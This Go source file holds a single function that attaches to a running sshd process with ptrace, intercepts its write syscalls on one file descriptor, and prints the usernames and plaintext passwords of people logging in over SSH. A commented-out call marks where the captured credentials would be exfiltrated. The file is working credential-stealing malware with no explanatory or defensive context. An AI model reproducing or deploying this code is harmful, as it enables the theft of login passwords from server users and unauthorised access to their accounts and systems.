package main

import (
	"fmt"
	"io/ioutil"
	"regexp"
	"strings"
	"syscall"
)

func traceSSHDProcess(pid int) {
	err := syscall.PtraceAttach(pid)
	if err != nil {
		return
	}
	defer syscall.PtraceDetach(pid)

	var status syscall.WaitStatus
	_, err = syscall.Wait4(pid, &status, syscall.WSTOPPED, nil)
	if err != nil {
		return
	}
	var username string
	for {
		err = syscall.PtraceSyscall(pid, 0)
		if err != nil {
			return
		}

		_, err = syscall.Wait4(pid, &status, 0, nil)
		if err != nil {
			return
		}

		if status.Exited() {
			break
		}
		if status.Stopped() && status.StopSignal() == syscall.SIGTRAP {
			reg := &syscall.PtraceRegs{}
			err := syscall.PtraceGetRegs(pid, reg)
			if err != nil {
				return
			}

			if reg.Orig_rax == 1 {
				buffer := make([]byte, reg.Rdx)
				_, err := syscall.PtracePeekData(pid, uintptr(reg.Rsi), buffer)
				if err != nil {
					return
				}
				cmdline, _ := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
				matches := regexp.MustCompile(`sshd: ([a-zA-Z]+) \[net\]`).FindSubmatch(cmdline)
				if len(matches) == 2 {
					username = string(matches[1])
				}
				if reg.Rdi == 5 && len(buffer) < 250 && len(buffer) > 5 && string(buffer) != "" {
					excludeString := "\\x00\\x00\\x00.\\f"
					if !regexp.MustCompile(excludeString).MatchString(string(buffer)) {
						password := strings.TrimLeft(string(buffer), "\n")
						//exfiltratePassword(password, username)
						fmt.Printf("u: %s, p: %s\n", username, password)
					}
				}

			}
		}

		err = syscall.PtraceSyscall(pid, 0)
		if err != nil {
			return
		}

		_, err = syscall.Wait4(pid, &status, 0, nil)
		if err != nil {
			return
		}
	}
}
